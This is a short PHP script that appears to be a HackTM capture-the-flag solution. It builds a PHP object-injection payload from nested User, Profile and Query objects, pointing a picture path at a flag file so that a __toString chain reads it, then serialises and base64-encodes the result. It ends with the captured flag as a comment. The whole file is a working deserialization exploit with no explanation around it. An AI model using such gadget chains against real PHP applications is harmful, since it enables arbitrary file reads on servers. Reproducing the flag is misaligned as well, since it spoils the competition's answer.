<?php

class User {
    public $profile;
    public $posts = array();
}

class Profile {
    public $username = 'haha';
    public $picture_path = "images/real_programmers.png";
}

class Query {
    public $query_string = "";
    public $args;
}

$prof = new Profile();
$prof->picture_path = "/02d92f5f-a58c-42b1-98c7-746bbda7abe9/flag.txt";
$tostr = new User();
$tostr->profile = $prof;
$q = new Query();
$q->query_string = $tostr;
$source = new User();
$source->profile = $q;

echo base64_encode(serialize($source));
//! HackTM{r3t__toString_1s_s0_fun_13c573f6}